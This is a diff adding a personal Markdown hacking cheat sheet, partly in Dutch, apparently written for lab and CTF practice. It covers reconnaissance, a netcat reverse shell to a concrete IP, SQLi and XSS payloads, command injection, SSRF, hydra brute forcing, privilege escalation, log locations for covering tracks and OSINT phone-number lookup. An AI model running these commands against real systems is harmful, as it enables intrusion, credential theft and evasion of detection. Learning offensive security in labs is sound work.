@@ -1,0 +1,337 @@
+# Hacking
+
+## Reconnaissance
+
+### Nmap Scan
+- `nmap -sC -sV nmap 10.10.10.14 > nmap_scan`
+- SYN/Stealth scan: `nmap -sS <target>`
+- Most common UDP ports scan (takes longer than TCP): `nmap -sU --top-ports 20 <target>`
+- Ping sweet (network host discovery): `nmap -sn 192.168.0.0/24` or `nmap -sn 192.168.0.1-254`
+- Nmap Scripting Engine (NSE): https://nmap.org/book/nse-usage.html
+- Scripts: https://nmap.org/nsedoc/
+- Search Scripts: `grep "ftp" /usr/share/nmap/scripts/script.db`
+- Also: `ls -l /usr/share/nmap/scripts/*ftp*`
+- Skip using ping for host disdovery `-Pn`
+- decide maximum transfer unit: `--mtu <number>` (must be multiples of 8)
+- scan delay: `--scan-delay <time>ms`
+- generate invalid chacksum for packets: `--badsum`
+
+#### Nmap Firewall/IDS evasion
+- https://nmap.org/book/man-bypass-firewalls-ids.html
+- `-f` used to fragment packets
+
+### Searchsploit
+- `searchsploit [name]`
+- show exploit: `searchsploit -x 41006.txt`
+
+### Search DNS information
+- `nslookup domain.com`
+- `dig axfr @10.10.10.13 cronos.htb`
+
+### Change hostname
+- `vi /etc/hosts`
+- `10.10.10.13              cronos.htb`
+
+## Delivery
+
+### Upload file to target
+- own host: `python -m SimpleHTTPServer`
+- target host: `wget -r http://hostIP:8000/`
+- OR; `python -m http.server 8080`
+
+#### Using Netcat
+- listen for incoming file on target: `nc -l -p 1337 > LinEnum.sh`
+- send the file from own host: `nc -w 3 [ip-add-target] 1337 < LinEnum.sh`
+
+## Web Exploitation
+
+### Iterative command example
+`for i in $(seq 1 20); do echo -n “$i: “; curl -s http://10.10.10.10/index.php/$i/ | grep ‘[title]’; done`
+
+### Wfuzz
+- voorbeeld: `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`
+- voorbeeld: `wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.thm/login.php`
+- handige lijsten: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
+
+### Gobuster
+- voorbeeld: `gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html`
+- handige lijsten: 
+
+### Vega
+- website vulnerability scanner
+- tutorial: https://www.youtube.com/watch?v=1HDC6fKsKYE
+
+### Burp Suite
+- change hostname with Burp sometimes works `Host: cronos.htb`
+
+#### Burp Intruder
+- Sniper attack - probeert alle in een wordlist op de plek tussen §
+- Cluster bomb attack - itereert over meerdere lijsten (zoals username/ password)
+
+### Reverse Shells
+- upload reverse shell (/usr/share/webshells in Kali)
+- verander IP addres en port nummer
+- op je eigen systeem `sudo nc -lvnp [port]`
+- maak een HTTP request naar de shell om hem te runnen
+
+#### Test command execution
+- start tcpdump listener for ICMP: `sudo tcpdump ip proto \\icmp -i tun0`
+- run command on target: `ping [local tun0 ip] -c 1`
+
+#### Generate reverse shell command for Telnet
+- `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
+- result: `mkfifo /tmp/uxto; nc 10.9.222.201 4444 0</tmp/uxto | /bin/sh >/tmp/uxto 2>&1; rm /tmp/uxto`
+
+### SQLMap
+- copy login request from Burp
+- paste in vim
+- remove spaces
+- `sqlmap -r login.req`
+
+### Wordpress
+- `wpscan -u http://10.10.10.14`
+- search for usernames `--enumerate u`
+- 'Easiest way to edit a PHP file as admin is via the Wordpress templating engine'
+
+### Send Post Request
+- Safe POST REQUEST in a local folder
+- `python -m SimpleHTTPServer`
+- Go to `localhost:8000` in browser
+
+### SQLi
+- most commonly used comments for SQLi payloads: `--+` and `/*`
+- also `-- -` is used
+- asking the database if it's first number is 's' (115 in ADCII)
+- `?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+`
+
+#### UNION SQLi attack
+1. Finding the number of columns
+2. Checking if the columns are suitable
+3. Attack and het some interesting data
+
+1. `' ORDER BY 1--`, `' ORDER BY 2--` until error
+1. `' UNION SELECT NULL,NULL,NULL--` untill error
+2. `' UNION SELECT 'a',NULL,NULL,NULL--`, `' UNION SELECT NULL,'a',NULL,NULL--`
+
+#### SQLMap
+- `sqlmap --url http://tbfc.net/login.php --tables --columns`
+- useful cheat sheet: https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
+- payloads: https://github.com/payloadbox/sql-injection-payload-list
+- other payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+
+#### SQLMap & BurpSuite
+- send the login request to repeater
+- save request: right mouse > save item
+- `sqlmap -r filename`
+
+### XSS
+- Cross Site Scripting
+
+#### Stored XSS
+- XSS example in comment: `<script>alert("Test")</script>`
+- malicious image: `<img src='LINK' onmouseover="alert('xss')">`
+- malicious URL: `<https://somewebsite.com/titlepage?id=> <script> evilcode() </script>`
+- test with: `<h1></h1>` and `<b></b>`
+
+#### OWASP ZAP
+- use automated scan to search for XSS vulnerabilities
+
+### Command Injection
+- Via CGI (Common Gateway Interface) scripts: `192.168.1.200/cgi-bin/systeminfo.sh?&whoami`
+
+### Server Site Request Forgery
+- if this link works: `http://10.10.0.150/?proxy=http://list.hohoho:8080/search.php?name=test`
+- you can change the proxy to redirect to localhost with `localtest.me`
+- `http://10.10.0.150/?proxy=http://list.hohoho.localtest.me`
+
+## PrivEsc
+1. Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
+2. Locating other services running or applications installed that may be abusable (SUID & out of date software)
+3. Looking for automated scripts like backup scripts (exploiting crontabs)
+4. Credentials (user accounts, application config files..)
+5. Mis-configured file and directory permissions
+
+### Enumeration
+- `uname -a`
+- `sudo -l`
+- `whoami`
+- show our shell: `echo $0`
+- find SSH keys: `find / -name id_rsa 2> /dev/null`
+
+### find SUID bit Linux
+- `find / -perm -u=s -type f 2>/dev/null`
+- `find / -perm 4000 2>/dev/null`
+
+### Useful links
+- GTFOBins: https://gtfobins.github.io/
+- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
+- https://payatu.com/guide-linux-privilege-escalation
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
+
+### Useful privesc scripts
+- LinEnum.sh, download: https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+- LinPEAS
+- linuxprivchecker.py
+- unixprivesc.py
+
+## OSINT
+
+### Username find tools
+- https://namechk.com/
+- https://whatsmyname.app/
+- https://namecheckup.com/
+- https://github.com/WebBreacher/WhatsMyName
+- https://github.com/sherlock-project/sherlock
+
+### Reverse Image Search
+- https://google.com
+- https://tineye.com/
+- https://www.bing.com/visualsearch?FORM=ILPVIS
+- https://yandex.com/images/
+- https://pimeyes.com
+
+#### Images
+- http://exif.regex.info/exif.cgi
+- check metadata of image: `exiftool image.png`
+
+### Data breach search
+- https://haveibeenpwned.com/
+- https://scylla.sh/
+- https://dehashed.com/ (wel betaald)
+
+### grep.app
+- Tool om Git repositories te doorzoeken.
+
+### RevealName.com
+- Reveals someone's phone number
+
+## Crypto
+- useful site: rumkin.com/tools
+
+## Reverse Shells
+- Pentestmonkey reverse shell cheatsheet
+- `python -c ‘import pty;pty.spawn(“/bin/bash”);’`
+- Crtl Z (process to background)
+- `stty raw -echo`
+- Then foreground
+
+## SSH
+- `hydra -L users.txt -P passwords.txt ssh://10.10.10.7`
+
+### decrypt encrypted RSA/SSH key
+- `ssh2john filename > newfilename`
+- `john newfilename -w=/usr/share/wordlists/rockyou.txt`
+
+### Steganography tools
+- `strings filename`
+- `binwalk filename`
+- `steghide extract -sf filename`
+
+## Protocols
+
+### SMB/NFS (Samba)
+- find usernames `sudo enum4linux -U 10.5.4.2`
+- find shared `sudo enum4linux -S 10.5.4.2`
+- connect to share `sudo smbclient //10.5.4.2//sharename`
+- sometimes no password is needed
+
+## Covering tracks
+
+### Important log files
+- /var/log/auth.log (attempted logins for SSH, changes too or logging in as system users)
+- /var/log/syslog (system events such as firewall alerts)
+- /var/log/[service] (for example /var/log/apache2)
+
+## Metasploit
+
+### Meterpreter
+- Post exploit recon for vulnerabilities: `run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true`
+
+## Forensics
+
+### Memory
+- extract raw memory tools:
+    - FTK Imager
+    - Redline
+    - DumpIt.exe
+    - win32dd.exe / win64dd.exe
+- pull unencrypted memory from Windows PC: `%SystemDrive%/hiberfil.sys` (Windows hibernation file)
+- VM memory files:
+    - VMware `.vmem`
+    - Hyper-V `.bin`
+    - Parallels - `.mem`
+    - VirtualBox `.sav`
+
+### Volatility
+- view image info: `volatility -f MEMORY_FILE.raw imageinfo`
+- test profile and list processes: `volatility -f MEMORY_FILE.raw --profile=PROFILE pslist`
+- show network connections: `volatility -f MEMORY_FILE.raw --profile=PROFILE netscan`
+- view hidden processes: `volatility -f MEMORY_FILE.raw --profile=PROFILE psxview`
+- if any are false, that means it could be injected (bad thing) `volatility -f MEMORY_FILE.raw --profile=PROFILE ldrmodules`
+- view unexpected patches in the standard system DLLs (Hooking module: `<unknown>` is really bad): `volatility -f MEMORY_FILE.raw --profile=PROFILE apihooks`
+- find malicious code and dump: `volatility -f MEMORY_FILE.raw --profile=PROFILE malfind -D <Destination Directory>`
+- list all of the DLLs in memory: `volatility -f MEMORY_FILE.raw --profile=PROFILE dlllist`
+- dump the DLL's from memory with specific process ID: `volatility -f MEMORY_FILE.raw --profile=PROFILE --pid=PID dlldump -D <Destination Directory>`
+
+## Reverse Engineering
+- Assembly file `.s`
+- Object program `.o`
+
+### Radare2
+- open binary in debugging mode: `r2 -d ./<binary_name>`
+- analyze the program with `aa` (can take a while)
+- open help: `?` or help for specific function: `?a`
+- find list of functions: `afl`
+- find functions at main: `afl | grep "main"`
+- examine assembly code at main: `pdf @main` (print disassembly function)
+- set a breakpoint: `db 0x00400b55`
+- run the program to hit the breakpoint: `dc`
+- view contents of variable: `px @memory-address` example: `px @rbp-0xc`, can be found in first lines of the code
+- go to next instruction: `ds`
+- show value of registers: `dr`
+- if you make a mistake, reload the program with: `ood`
+- cheatsheet: https://scoding.de/uploads/r2_cs.pdf
+
+![](rev.png)
+
+Some other important instructions:
+- leaq source, destination: this instruction sets destination to the address denoted by the expression in source
+- addq source, destination: destination = destination + source
+- subq source, destination: destination = destination - source
+- imulq source, destination: destination = destination * source
+- salq source, destination: destination = destination << source where << is the left bit shifting operator
+- sarq source, destination: destination = destination >> source where >> is the right bit shifting operator
+- xorq source, destination: destination = destination XOR source
+- andq source, destination: destination = destination & source
+- orq source, destination: destination = destination | source
+
+### Disassembly rools for .NETFramework applications
+- ILSpy
+- Dotpeek
+
+## Other tricks
+- Create files in /dev/shm. This is empied during reboot, so you don’t have to clean up.
+- Output errors to the ‘bitbucket’ 2>/dev/null
+- Back to previous folder: `cd -`
+- Sometimes, useful information is stored in the SSL certificate
+- Use FoxyProxy Firefox browser addon to easily enable the Burp proxy
+- Obfuscated but filled in passwords in the browser can still be seen via the inspector function
+
+### Zip and unzip
+- zip a directory: `tar cvzf tarball.tar.gz directory/`
+- unzip a directory: `tar xvzf tarball.tar.gz`
+
+### FTP
+- common 'cwd' vulnerability in legacy FTP versions: `https://www.exploit-db.com/exploits/20745`
+- brute force password with hydra: `hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`
+
+### NFS
+- NFS enumeration tool: NFS-Common
+- mount: `sudo mount -t nfs IP:share /tmp/mount/ -nolock`
+- Show the NFS server's export list: `showmount -e 10.10.180.248`
+
+### Alternate Data Stream (hide .exe in .exe)
+- scan malicious EXE in Powershell: `c:\Tools\strings64.exe -accepteula file.exe`
+- `-Stream` in the output can relate to ADS
+- view ADS using Powershell: `Get-Item -Path file.exe -Stream *`
+- execute hidden EXE stream: `wmic process call create $(Resolve-Path file.exe:streamname)`
